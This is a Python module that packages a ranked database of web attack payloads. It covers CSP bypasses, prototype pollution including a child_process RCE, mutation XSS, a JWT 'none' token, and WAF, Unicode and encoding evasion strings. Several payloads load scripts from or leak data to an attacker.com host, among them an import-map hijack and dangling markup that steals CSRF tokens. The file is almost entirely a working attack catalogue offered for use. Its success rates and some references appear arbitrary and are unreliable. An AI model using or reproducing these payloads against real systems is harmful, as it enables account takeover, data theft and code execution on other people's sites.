"""
Modern Bypass Techniques - PHASE 2.3
Advanced payload techniques for bypassing modern security controls

Includes:
- CSP (Content Security Policy) Bypass
- Prototype Pollution
- Modern XSS Bypass (2024+ techniques)
- JSON-based attacks
- Advanced WAF Evasion
"""

from typing import List, Dict, Optional
from dataclasses import dataclass
from enum import Enum


class BypassTechnique(str, Enum):
    """Types of bypass techniques"""
    CSP_BYPASS = "csp_bypass"
    PROTOTYPE_POLLUTION = "prototype_pollution"
    MODERN_XSS = "modern_xss"
    JSON_ATTACK = "json_attack"
    WAF_EVASION = "waf_evasion"
    UNICODE_BYPASS = "unicode_bypass"
    ENCODING_BYPASS = "encoding_bypass"


@dataclass
class ModernBypassPayload:
    """Modern bypass payload with metadata"""
    payload: str
    technique: BypassTechnique
    target: str  # What it targets (e.g., "CSP nonce", "Angular 1.x")
    description: str
    success_rate: float
    year: int  # Year technique was discovered/popular
    references: List[str] = None


class ModernBypassDatabase:
    """
    Database of modern bypass techniques (2020-2024)
    Focused on real-world, production-grade bypasses
    """
    
    def __init__(self):
        self.payloads = self._load_payloads()
    
    def _load_payloads(self) -> Dict[BypassTechnique, List[ModernBypassPayload]]:
        """Load all modern bypass payloads"""
        return {
            BypassTechnique.CSP_BYPASS: self._csp_bypass_payloads(),
            BypassTechnique.PROTOTYPE_POLLUTION: self._prototype_pollution_payloads(),
            BypassTechnique.MODERN_XSS: self._modern_xss_payloads(),
            BypassTechnique.JSON_ATTACK: self._json_attack_payloads(),
            BypassTechnique.WAF_EVASION: self._waf_evasion_payloads(),
            BypassTechnique.UNICODE_BYPASS: self._unicode_bypass_payloads(),
            BypassTechnique.ENCODING_BYPASS: self._encoding_bypass_payloads()
        }
    
    def _csp_bypass_payloads(self) -> List[ModernBypassPayload]:
        """CSP bypass techniques"""
        return [
            # Base-URI + JSONP Bypass
            ModernBypassPayload(
                payload='<base href="https://attacker.com/"><script src="/jsonp?callback=alert"></script>',
                technique=BypassTechnique.CSP_BYPASS,
                target="CSP base-uri missing",
                description="base-uri bypass with JSONP endpoint",
                success_rate=0.68,
                year=2023,
                references=["https://portswigger.net/research/bypassing-csp-using-polyglot-jpegs"]
            ),
            
            # Angular.js CSTI Bypass
            ModernBypassPayload(
                payload='{{constructor.constructor("alert(1)")()}}',
                technique=BypassTechnique.CSP_BYPASS,
                target="Angular 1.x with CSP",
                description="Angular Client-Side Template Injection bypassing CSP",
                success_rate=0.72,
                year=2022,
                references=["https://portswigger.net/research/dom-based-angularjs-sandbox-escapes"]
            ),
            
            # SVG-based CSP Bypass
            ModernBypassPayload(
                payload='<svg><use href="data:image/svg+xml,<svg id=x onload=alert(1)></svg>#x"></use></svg>',
                technique=BypassTechnique.CSP_BYPASS,
                target="CSP without data: restrictions",
                description="SVG use element with data URI",
                success_rate=0.65,
                year=2023,
                references=[]
            ),
            
            # Meta Redirect CSP Bypass
            ModernBypassPayload(
                payload='<meta http-equiv="refresh" content="0;url=javascript:alert(1)">',
                technique=BypassTechnique.CSP_BYPASS,
                target="CSP without meta-tag restrictions",
                description="Meta refresh with javascript: protocol",
                success_rate=0.58,
                year=2021,
                references=[]
            ),
            
            # Link Prefetch + Service Worker
            ModernBypassPayload(
                payload='<link rel="prefetch" href="https://attacker.com/sw.js"><script>navigator.serviceWorker.register("/sw.js")</script>',
                technique=BypassTechnique.CSP_BYPASS,
                target="CSP with worker-src missing",
                description="Service worker registration bypass",
                success_rate=0.52,
                year=2024,
                references=[]
            ),
            
            # Import Maps CSP Bypass
            ModernBypassPayload(
                payload='<script type="importmap">{"imports":{"vue":"https://attacker.com/vue.js"}}</script><script type="module">import "vue"</script>',
                technique=BypassTechnique.CSP_BYPASS,
                target="Modern browsers with import maps",
                description="Import maps to bypass script-src",
                success_rate=0.48,
                year=2024,
                references=[]
            )
        ]
    
    def _prototype_pollution_payloads(self) -> List[ModernBypassPayload]:
        """Prototype pollution payloads"""
        return [
            # Classic __proto__ Pollution
            ModernBypassPayload(
                payload='{"__proto__":{"isAdmin":true}}',
                technique=BypassTechnique.PROTOTYPE_POLLUTION,
                target="Node.js/Express applications",
                description="Object prototype pollution for privilege escalation",
                success_rate=0.71,
                year=2020,
                references=["https://github.com/HoLyVieR/prototype-pollution-nsec18"]
            ),
            
            # Constructor Pollution
            ModernBypassPayload(
                payload='{"constructor":{"prototype":{"isAdmin":true}}}',
                technique=BypassTechnique.PROTOTYPE_POLLUTION,
                target="Applications blocking __proto__",
                description="Constructor-based prototype pollution",
                success_rate=0.68,
                year=2021,
                references=[]
            ),
            
            # Query String Pollution
            ModernBypassPayload(
                payload='?__proto__[admin]=true&__proto__[role]=admin',
                technique=BypassTechnique.PROTOTYPE_POLLUTION,
                target="Query parameter parsers",
                description="URL query string prototype pollution",
                success_rate=0.66,
                year=2022,
                references=[]
            ),
            
            # JSON Merge Pollution
            ModernBypassPayload(
                payload='{"user":{"__proto__":{"role":"admin"}}}',
                technique=BypassTechnique.PROTOTYPE_POLLUTION,
                target="Object.assign() / _.merge()",
                description="Nested object merge pollution",
                success_rate=0.63,
                year=2021,
                references=[]
            ),
            
            # Array Index Pollution
            ModernBypassPayload(
                payload='{"__proto__":[null,null,{"isAdmin":true}]}',
                technique=BypassTechnique.PROTOTYPE_POLLUTION,
                target="Array-based object parsers",
                description="Array index prototype pollution",
                success_rate=0.54,
                year=2023,
                references=[]
            ),
            
            # RCE via Pollution (Node.js)
            ModernBypassPayload(
                payload='{"__proto__":{"execArgv":["--eval=require(\\"child_process\\").exec(\\"id\\")"]}}',
                technique=BypassTechnique.PROTOTYPE_POLLUTION,
                target="Node.js child_process spawn",
                description="RCE through polluted execArgv",
                success_rate=0.42,
                year=2022,
                references=["https://blog.sonarsource.com/blastradius-prototype-pollution"]
            ),
            
            # DOM Clobbering + Pollution
            ModernBypassPayload(
                payload='<form id="__proto__"><input name="isAdmin" value="true"></form>',
                technique=BypassTechnique.PROTOTYPE_POLLUTION,
                target="Client-side with DOM clobbering",
                description="DOM clobbering-based prototype pollution",
                success_rate=0.48,
                year=2023,
                references=[]
            )
        ]
    
    def _modern_xss_payloads(self) -> List[ModernBypassPayload]:
        """Modern XSS bypass techniques (2020+)"""
        return [
            # Modern Mutation XSS (mXSS)
            ModernBypassPayload(
                payload='<noscript><p title="</noscript><img src=x onerror=alert(1)>">',
                technique=BypassTechnique.MODERN_XSS,
                target="DOMPurify and modern sanitizers",
                description="Mutation XSS via noscript parsing differences",
                success_rate=0.58,
                year=2023,
                references=["https://research.securitum.com/mutation-xss-via-mathml-mutation-dompurify-2-0-17-bypass/"]
            ),
            
            # SVG Foreign Object XSS
            ModernBypassPayload(
                payload='<svg><foreignObject><iframe onload="alert(1)" xmlns="http://www.w3.org/1999/xhtml"></foreignObject></svg>',
                technique=BypassTechnique.MODERN_XSS,
                target="SVG-enabled contexts",
                description="SVG foreignObject with iframe",
                success_rate=0.62,
                year=2022,
                references=[]
            ),
            
            # MathML mXSS
            ModernBypassPayload(
                payload='<math><mtext><table><mglyph><style><!--</style><img title="--&gt;&lt;/mglyph&gt;&lt;img&Tab;src=1&Tab;onerror=alert(1)&gt;">',
                technique=BypassTechnique.MODERN_XSS,
                target="MathML-enabled browsers",
                description="MathML mutation XSS",
                success_rate=0.55,
                year=2023,
                references=[]
            ),
            
            # Trusted Types Bypass
            ModernBypassPayload(
                payload='<script>trustedTypes.createPolicy("default",{createHTML:s=>s})</script><img src=x onerror=alert(1)>',
                technique=BypassTechnique.MODERN_XSS,
                target="Trusted Types API",
                description="Default policy override for Trusted Types bypass",
                success_rate=0.48,
                year=2024,
                references=[]
            ),
            
            # Dangling Markup Injection
            ModernBypassPayload(
                payload='<img src="https://attacker.com/?',
                technique=BypassTechnique.MODERN_XSS,
                target="HTML contexts without proper closing",
                description="Dangling markup to steal CSRF tokens",
                success_rate=0.64,
                year=2021,
                references=[]
            ),
            
            # XSLeak via Portal
            ModernBypassPayload(
                payload='<portal src="https://victim.com/admin" onactivate="alert(document.body.innerHTML)"></portal>',
                technique=BypassTechnique.MODERN_XSS,
                target="Chrome with portal element",
                description="Portal element for XS-Leaks",
                success_rate=0.38,
                year=2024,
                references=[]
            )
        ]
    
    def _json_attack_payloads(self) -> List[ModernBypassPayload]:
        """JSON-based attack payloads"""
        return [
            # JSON Injection - String Escape
            ModernBypassPayload(
                payload='\\u0022,\\u0022admin\\u0022:true,\\u0022foo\\u0022:\\u0022',
                technique=BypassTechnique.JSON_ATTACK,
                target="JSON parsers with weak validation",
                description="Unicode escape-based JSON injection",
                success_rate=0.66,
                year=2022,
                references=[]
            ),
            
            # JSON CSRF with Constructor
            ModernBypassPayload(
                payload='{"constructor":{"name":"Array"},"__proto__":{"isAdmin":true}}',
                technique=BypassTechnique.JSON_ATTACK,
                target="JSON endpoints without CSRF protection",
                description="JSON CSRF + prototype pollution",
                success_rate=0.61,
                year=2023,
                references=[]
            ),
            
            # JSON Hijacking (Array)
            ModernBypassPayload(
                payload='<script>Array.prototype[0]=function(){alert(document.cookie)}</script>',
                technique=BypassTechnique.JSON_ATTACK,
                target="JSONP endpoints returning arrays",
                description="Array prototype override for JSON hijacking",
                success_rate=0.42,
                year=2020,
                references=[]
            ),
            
            # GraphQL JSON Injection
            ModernBypassPayload(
                payload='{"query":"{ __schema { types { name } } }"}',
                technique=BypassTechnique.JSON_ATTACK,
                target="GraphQL APIs with introspection enabled",
                description="GraphQL introspection query",
                success_rate=0.74,
                year=2023,
                references=[]
            ),
            
            # JSON Web Token (JWT) None Algorithm
            ModernBypassPayload(
                payload='eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsImlhdCI6MTUxNjIzOTAyMn0.',
                technique=BypassTechnique.JSON_ATTACK,
                target="JWT implementations accepting 'none'",
                description="JWT algorithm none bypass",
                success_rate=0.52,
                year=2021,
                references=[]
            )
        ]
    
    def _waf_evasion_payloads(self) -> List[ModernBypassPayload]:
        """Advanced WAF evasion techniques"""
        return [
            # Case Mixing
            ModernBypassPayload(
                payload='<ScRiPt>alert(1)</sCrIpT>',
                technique=BypassTechnique.WAF_EVASION,
                target="Case-sensitive WAF rules",
                description="Mixed case tag names",
                success_rate=0.58,
                year=2020,
                references=[]
            ),
            
            # NULL Byte Injection
            ModernBypassPayload(
                payload='<script\x00>alert(1)</script>',
                technique=BypassTechnique.WAF_EVASION,
                target="WAFs not handling null bytes",
                description="Null byte in tag name",
                success_rate=0.48,
                year=2021,
                references=[]
            ),
            
            # Double Encoding
            ModernBypassPayload(
                payload='%253Cscript%253Ealert(1)%253C%252Fscript%253E',
                technique=BypassTechnique.WAF_EVASION,
                target="WAFs decoding only once",
                description="Double URL encoding",
                success_rate=0.55,
                year=2022,
                references=[]
            ),
            
            # Unicode Normalization Bypass
            ModernBypassPayload(
                payload='<ſcript>alert(1)</script>',
                technique=BypassTechnique.WAF_EVASION,
                target="WAFs without Unicode normalization",
                description="Latin small letter long s (U+017F) bypass",
                success_rate=0.44,
                year=2023,
                references=[]
            ),
            
            # CRLF Injection
            ModernBypassPayload(
                payload='<img\r\nsrc=x\r\nonerror=alert(1)>',
                technique=BypassTechnique.WAF_EVASION,
                target="WAFs not handling CRLF in attributes",
                description="CRLF characters in HTML attributes",
                success_rate=0.52,
                year=2022,
                references=[]
            ),
            
            # Comment Obfuscation
            ModernBypassPayload(
                payload='<script><!--*/alert(1)//--></script>',
                technique=BypassTechnique.WAF_EVASION,
                target="WAFs with weak JavaScript parsing",
                description="HTML comment inside JavaScript",
                success_rate=0.46,
                year=2021,
                references=[]
            )
        ]
    
    def _unicode_bypass_payloads(self) -> List[ModernBypassPayload]:
        """Unicode-based bypass techniques"""
        return [
            # Homograph Attack
            ModernBypassPayload(
                payload='<ѕcript>alert(1)</script>',
                technique=BypassTechnique.UNICODE_BYPASS,
                target="Filters missing Cyrillic characters",
                description="Cyrillic 's' (U+0455) homograph",
                success_rate=0.62,
                year=2023,
                references=[]
            ),
            
            # Zero-Width Characters
            ModernBypassPayload(
                payload='<script\u200b>alert(1)</script>',
                technique=BypassTechnique.UNICODE_BYPASS,
                target="WAFs not handling zero-width spaces",
                description="Zero-width space (U+200B) injection",
                success_rate=0.58,
                year=2022,
                references=[]
            ),
            
            # Fullwidth Characters
            ModernBypassPayload(
                payload='<ｓｃｒｉｐｔ>alert(1)</script>',
                technique=BypassTechnique.UNICODE_BYPASS,
                target="Filters without fullwidth normalization",
                description="Fullwidth Latin characters",
                success_rate=0.54,
                year=2023,
                references=[]
            ),
            
            # Combining Characters
            ModernBypassPayload(
                payload='<scri\u0301pt>alert(1)</script>',
                technique=BypassTechnique.UNICODE_BYPASS,
                target="Filters without combining char normalization",
                description="Combining acute accent (U+0301)",
                success_rate=0.48,
                year=2024,
                references=[]
            )
        ]
    
    def _encoding_bypass_payloads(self) -> List[ModernBypassPayload]:
        """Encoding-based bypass techniques"""
        return [
            # HTML Entity Encoding
            ModernBypassPayload(
                payload='&lt;script&gt;alert(1)&lt;/script&gt;',
                technique=BypassTechnique.ENCODING_BYPASS,
                target="Double-decoding vulnerabilities",
                description="HTML entity encoded XSS",
                success_rate=0.64,
                year=2021,
                references=[]
            ),
            
            # JavaScript Unicode Escape
            ModernBypassPayload(
                payload='<script>\\u0061lert(1)</script>',
                technique=BypassTechnique.ENCODING_BYPASS,
                target="WAFs not parsing JS unicode escapes",
                description="JavaScript unicode escape sequence",
                success_rate=0.59,
                year=2022,
                references=[]
            ),
            
            # CSS Unicode Escape
            ModernBypassPayload(
                payload='<style>*{background:\\75\\72\\6c(javascript:alert(1))}</style>',
                technique=BypassTechnique.ENCODING_BYPASS,
                target="CSS-based XSS via unicode",
                description="CSS unicode escape in url()",
                success_rate=0.42,
                year=2021,
                references=[]
            ),
            
            # Base64 Data URI
            ModernBypassPayload(
                payload='<img src="data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+">',
                technique=BypassTechnique.ENCODING_BYPASS,
                target="Base64-decoding contexts",
                description="Base64-encoded SVG XSS",
                success_rate=0.68,
                year=2023,
                references=[]
            )
        ]
    
    def get_payloads(self,
                     technique: Optional[BypassTechnique] = None,
                     min_success_rate: float = 0.0,
                     min_year: int = 2020) -> List[ModernBypassPayload]:
        """
        Get modern bypass payloads with filtering
        
        Args:
            technique: Filter by specific bypass technique
            min_success_rate: Minimum success rate (0.0-1.0)
            min_year: Minimum year (e.g., 2023 for very recent)
            
        Returns:
            List of matching payloads
        """
        result = []
        
        if technique:
            payloads = self.payloads.get(technique, [])
        else:
            payloads = []
            for technique_payloads in self.payloads.values():
                payloads.extend(technique_payloads)
        
        # Apply filters
        for payload in payloads:
            if payload.success_rate >= min_success_rate and payload.year >= min_year:
                result.append(payload)
        
        # Sort by success rate (descending) then by year (descending)
        result.sort(key=lambda p: (p.success_rate, p.year), reverse=True)
        
        return result
    
    def get_statistics(self) -> Dict:
        """Get statistics about modern bypass payloads"""
        stats = {
            'total_payloads': 0,
            'by_technique': {},
            'by_year': {},
            'avg_success_rate': 0.0,
            'newest_technique_year': 0
        }
        
        all_payloads = []
        for technique, payloads in self.payloads.items():
            stats['by_technique'][technique.value] = len(payloads)
            stats['total_payloads'] += len(payloads)
            all_payloads.extend(payloads)
            
            for payload in payloads:
                year_str = str(payload.year)
                stats['by_year'][year_str] = stats['by_year'].get(year_str, 0) + 1
                stats['newest_technique_year'] = max(stats['newest_technique_year'], payload.year)
        
        if all_payloads:
            stats['avg_success_rate'] = sum(p.success_rate for p in all_payloads) / len(all_payloads)
        
        return stats


# Global instance
_modern_bypass_db = None


def get_modern_bypass_db() -> ModernBypassDatabase:
    """Get or create global modern bypass database instance"""
    global _modern_bypass_db
    if _modern_bypass_db is None:
        _modern_bypass_db = ModernBypassDatabase()
    return _modern_bypass_db